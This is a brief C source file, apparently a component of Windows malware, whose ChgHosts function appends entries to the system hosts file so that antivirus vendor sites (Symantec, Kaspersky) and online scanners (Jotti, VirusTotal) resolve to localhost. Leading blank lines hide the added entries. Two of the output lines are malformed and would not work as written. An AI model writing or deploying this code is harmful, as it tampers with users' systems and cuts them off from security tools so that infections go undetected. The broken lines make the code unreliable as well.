///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"


#ifndef NO_HOSTCHANGE
void ChgHosts() {

	char sysdir[MAX_PATH]; GetSystemDirectory(sysdir, sizeof(sysdir));
	strncat(sysdir, "\\drivers\\etc\\hosts", sizeof(sysdir));

	fp=fopen(sysdir, "a"); if(fp) {
		fprintf(fp, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
		fprintf(fp, "\n127.0.0.1\twww.symantec.com\n");
		fprintf(fp, "127.0.0.1\twww.kaspersky.com\n");
		fprintf(fp, "www.virusscan.jotti.org\error\www.virusscan.jotti.org\n");
		fprintf(fp, "www.virustotal.com\error\twww.virustotal.com\n");
		fclose(fp); 
	}
}
#endif